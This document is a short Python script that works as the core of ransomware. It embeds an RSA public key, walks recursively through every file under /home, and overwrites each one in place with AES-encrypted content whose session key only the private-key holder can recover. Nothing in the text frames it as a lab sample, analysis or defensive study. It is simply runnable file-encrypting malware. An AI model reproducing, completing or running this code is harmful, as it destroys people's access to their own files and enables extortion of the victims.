import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

pubKey = """
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAy3jSSKrnksTRG5AcLi7h
+one5kCzJ9+GjUzboq/Au/y2TKikbUg0mh2U38CdFNMQTlVYQPdxG6EB5xfLmvoX
IeGugg6XOVwCJUYRok+k0zyBbWmi4fcYH21kqfKTA+mlH9NsEYM0l5UcyEyxKzV5
T/qxrlGk474rns19Pi0QypVBLMNdFh4aNuoxvOIHl8vJvw4Uw+CmMJPNmyY60S/P
zK0si7N71DT3abw92B0LwKSTgg5puBdR6xsjlpNjia6q6cGcbdm6GdQ4dsXV3FMP
5JiA9B4Rs/XbUCn0hriYFM1Ss2TVaX3lLMkIzorqP6/pZA4RbO3gsuCJXJ3ANUoc
3gBgIGRnXM1iDzESyDB/MRyaCUIBxdJ5Bj9JNI3CU6MrJSQTuxOlXaMrlQhfsai8
pswHHD2VhPY5mBWGab8ASyt3ULbwXlvC3cUaoJzDxT4Eo3M3J4sms9jq6yVA17hc
Lf892ceQQm9apLbjliZ+C6xSeqTl+ik6e1iwDdV06bxW5P1o2k6N3O4asx76N7VS
Roy2Ged99nWhNtERb8k795o3Xu26TlUUOYaIEhMG54VUxZPabNIGTBej4mJK+5hV
KlxtVRmlMlNg/QuKqWcloo14gh5Femd7WsS2l9WSu6iKpaRSB7sYnVz+RrGU0rjW
d/NtYRjIL6pVUKR0Rr0uYC8CAwEAAQ==
"""
pub64 = base64.b64decode(pubKey)

def iterateDir(baseDir):
    for d in os.scandir(baseDir):
        if d.is_file():
            yield d
        else:
            yield from iterateDir(d.path)

def encrypt(path):
    extension = path.suffix.lower()

    path = str(path)

    with open(path, 'rb+') as f:
        data = f.read()

        f.seek(0)

        data = bytes(data)

        key = RSA.importKey(pub64)
        sessionKey = os.urandom(16)
        cipher = PKCS1_OAEP.new(key)
        encryptedSessionKey = cipher.encrypt(sessionKey)
        cipher = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
        f.truncate()

baseDir = "/home"

for p in iterateDir(baseDir): 
    path = Path(p)
    encrypt(path)
